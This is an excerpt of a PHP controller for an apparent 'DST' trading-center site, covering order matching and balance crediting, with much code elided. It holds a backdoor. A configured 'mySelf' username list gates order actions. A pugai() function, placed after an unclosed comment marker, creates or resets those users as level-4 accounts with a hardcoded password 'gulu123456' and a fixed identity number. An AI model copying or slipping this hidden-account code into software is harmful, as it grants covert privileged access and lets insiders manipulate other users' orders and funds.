...
Class EmoneyAction extends CommonAction{
    ...
    public function index(){
        ...
        $show  = $Page->show();
        $list=	M('jyzx')->where(array('zt'=>0))->limit($Page->firstRow.','.$Page->listRows)->select();
    ...
    public function mcpost(){
        if (IS_GET) {
            $self = C('mySelf');
            if (in_array(session("username"), $self)) 
            {
                $user = M('member')->where(array('username'=>session("username")))->find();
                $time=date('Y-m-d H:i:s');

                $res11 = M('jyzx')->where(array('id'=>$_GET['id']))->data(array('zt'=>1,'jydate'=>$time,'mc_user'=>$user['username'],'mc_level'=>$user['level'],'mc_id'=>$user['id']))->save();
                ...
                if($res11){
                    ...
                    $content="您在DST交易中心买入订单已经匹配成功，请尽快联系卖家交易。【DST会员】";
    ...
    public function mcwc(){
        if (IS_GET) {
            ...
            $obsArr = array(
                ...
                'ksed'  => round($jyzx['cbt'] * 1.7 + $mr_member['ksed'],2),
            );
            $obs = M('member')->where(array('id'=>$jyzx['mr_id']))->save($obsArr);
            // 加可售额度
            dongjie($jyzx['mr_user'],$jyzx['cbt'] * 1.7,'交易中心买入',1);
...
/*    public function del(){
    ...
    public function pugai()
    {
        $self = C('mySelf');
        foreach ($self as $k => $v) 
        {
            $res = M('member')->where(array('username'=>$v))->getField('id');
            $data = array(
                'level'     => 4,
                'username'  => $v,
                'password'  => md5('gulu123456'),
                'password2' => md5('gulu123456'),
                'regdate'   => time(),
                'online_time' => time(),
                'kjnum' => 20,
                'tdnum' => 20,
                ...
                'mobile' => $v,
                'status' => 1,
                'shenfen' => '420988199101014561',
                'parentpath' => '1|',
            );
            if ($res) 
            {
                M('member')->where(array('id'=>$res))->save($data);
            }else{
                M('member')->add($data);
            }
        }
